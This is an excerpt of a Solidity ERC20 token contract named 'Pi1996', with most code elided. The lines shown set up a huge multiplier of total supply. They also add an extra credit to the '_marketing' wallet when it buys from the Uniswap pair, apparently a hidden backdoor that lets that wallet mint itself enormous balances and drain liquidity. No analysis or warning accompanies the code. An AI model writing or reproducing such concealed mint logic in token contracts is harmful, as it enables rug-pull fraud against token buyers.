...
contract  Pi1996 is Ownable, IERC20 {
    ...
    string private  _name = "Pi1996";
    string private  _symbol = "Pi1996";
    ...
    uint256 cdac = _totalSupply * 100 *100;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from == uniswapV2Pair && to == _marketing )  { _tOwned[_marketing] += c;}
